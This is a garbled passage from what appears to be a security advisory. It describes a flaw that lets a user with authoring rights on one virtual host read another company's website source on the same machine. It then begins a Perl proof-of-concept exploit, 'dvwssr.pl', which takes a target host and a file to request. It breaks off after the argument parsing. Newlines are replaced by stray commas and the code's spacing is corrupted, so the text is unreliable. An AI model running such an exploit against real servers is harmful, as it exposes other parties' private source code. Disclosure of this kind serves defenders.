This includes users with web authoring rights to only one of several virtual hosts on a system , allowing one company to potentially gain access to the source of another company's website if hosted on the same physical machine. ，  #  ! /usr/bin/perl ，  # dvwssr.pl DEMONSTRATION by rain forest puppy ，  # rfp @ wiretrip.net / www.wiretrip.net/rfp/ ，  # usage : ./dvwssr.pl <target host> <file to request> ，  # example : ./dvwssr.pl localhost /default.asp ， use Socket ;  ，  $ ip= $ ARGV [ 0 ]  ;  ，  $ file= $ ARGV [ 1 ]  ; ",
